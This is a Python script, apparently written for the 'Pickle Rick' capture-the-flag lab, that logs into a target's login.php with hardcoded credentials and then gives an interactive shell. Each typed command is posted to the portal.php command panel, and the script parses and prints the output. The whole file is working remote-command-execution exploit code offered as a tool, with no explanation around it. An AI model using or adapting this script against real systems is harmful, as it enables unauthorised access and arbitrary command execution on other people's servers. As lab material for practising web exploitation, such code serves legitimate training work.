import requests
from bs4 import BeautifulSoup

def main():
    print("--- Pickle Rick RCE Exploit Tool ---")
    
    target_ip = input("Target IP Address: ").strip()
    
    login_url = f"http://{target_ip}/login.php"
    portal_url = f"http://{target_ip}/portal.php"
    username = "R1ckRul3s"
    password = "Wubbalubbadubdub"  

    s = requests.Session()

    print(f"[*] Attempting to login to {target_ip}...")
    
    login_data = {
        "username": username,
        "password": password,
        "sub": "Login"
    }
    
    try:
        s.post(login_url, data=login_data)
        
        check = s.get(portal_url)
        if "portal.php" not in check.url and "Command Panel" not in check.text:
            print("[-] Login failed! Check IP or password.")
            return
        
        print("[+] Login Successful! PickleShell is ready.")
        print("[*] Type 'exit' to quit.\n")

        while True:
            cmd = input(f"PickleShell@{target_ip}:~$ ")
            
            if cmd.lower() == "exit":
                print("[*] Closing connection...")
                break
            
            if not cmd.strip():
                continue
              
            payload = {"command": cmd, "sub": "Execute"}
            response = s.post(portal_url, data=payload)

            soup = BeautifulSoup(response.text, "html.parser")
            output = soup.find("pre")

            if output:
                print(output.text)
            else:
                print("[!] Output not found in <pre> tags.")

    except requests.exceptions.ConnectionError:
        print("\n[!] Error: Could not connect to the target. Check the IP address.")
    except KeyboardInterrupt:
        print("\n[*] Exiting.")

if __name__ == "__main__":
    main()
